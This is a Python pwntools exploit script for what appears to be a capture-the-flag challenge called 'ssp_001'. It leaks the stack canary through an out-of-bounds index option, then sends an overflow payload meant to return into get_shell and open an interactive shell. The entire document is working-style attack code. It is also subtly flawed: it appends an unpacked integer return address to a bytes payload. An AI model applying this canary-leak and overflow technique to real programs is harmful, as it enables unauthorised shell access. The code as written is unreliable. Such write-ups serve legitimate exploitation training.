from pwn import *

p = process("./ssp_001")
e = ELF("./ssp_001")
context.log_level = 'debug'
retAddr = e.symbols["get_shell"]

# Get canary using index
cnry = ""
for i in range(1,5):
    p.recvuntil(b"> ")
    p.sendline(b"P")
    p.sendlineafter(b"index : ", str(132-i))
    cnry += p.recvline()[-3:-1].decode()
print(f"canary: {cnry}")

payload = (b"A" * 0x40) + p32(int(cnry, 16)) + (b"B" * 8) + retAddr


p.recvuntil(b"> ")
p.sendline(b"E")
p.sendlineafter(b"Size : ", str(len(payload)))
p.sendafter(b"Name : ", payload)
p.interactive()
